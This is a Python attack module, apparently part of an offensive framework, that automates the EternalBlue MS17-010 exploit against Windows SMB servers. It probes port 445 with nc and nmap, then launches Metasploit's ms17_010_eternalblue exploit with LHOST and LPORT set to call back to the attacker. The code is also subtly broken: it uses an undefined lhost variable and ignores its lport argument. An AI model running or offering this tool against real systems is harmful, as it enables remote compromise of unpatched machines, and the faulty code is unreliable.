import subprocess
import sys
import os

def run_eternalblue(target):
    """Run EternalBlue MS17-010 exploit chain"""
    print(f"[+] EternalBlue: Scanning {target} for MS17-010")
    
    print("[+] Step 1: MS17-010 scanner...")
    try:
        result = subprocess.run([
            "nmap", "-p445", "--script", "smb-vuln-ms17-010",
            target
        ], capture_output=True, text=True, timeout=60)
        
        if "VULNERABLE" in result.stdout:
            print("[+] MS17-010 CONFIRMED VULNERABLE!")
        else:
            print("[!] MS17-010 not vulnerable or SMB disabled")
            print(result.stdout)
            return False
    except FileNotFoundError:
        print("[!] nmap not found - install: sudo apt install nmap")
        return False
    
    print("[+] Step 2: MSF EternalBlue exploit...")
    msf_cmd = f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target}
set LHOST {lhost}
set LPORT 4444
exploit
"""
    
    try:
        print("[+] Launching Metasploit (msfconsole required)...")
        print(f"[+] Commands:\n{msf_cmd}")
        subprocess.run(["msfconsole", "-q", "-x", msf_cmd.strip()], timeout=300)
    except FileNotFoundError:
        print("[!] Metasploit not found")
        print("[+] Manual MSF: msfconsole -> paste commands above")
    except subprocess.TimeoutExpired:
        print("[+] Exploit timeout - check msfconsole")
    
    return True

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - EternalBlue MS17-010"""
    print(f"[+] EternalBlue module: {target} -> {lhost}:{lport}")
    
    # Check prerequisites
    if not os.path.exists("/usr/share/metasploit-framework"):
        print("[!] Metasploit required: sudo apt install metasploit-framework")
        return
    
    # SMB port check
    print("[+] Checking SMB (445)...")
    result = subprocess.run(["nc", "-z", target, "445"], capture_output=True)
    if result.returncode != 0:
        print(f"[!] SMB closed on {target}:445")
        return
    
    print("[+] SMB open - running EternalBlue chain...")
    run_eternalblue(target)
    print("[+] EternalBlue complete")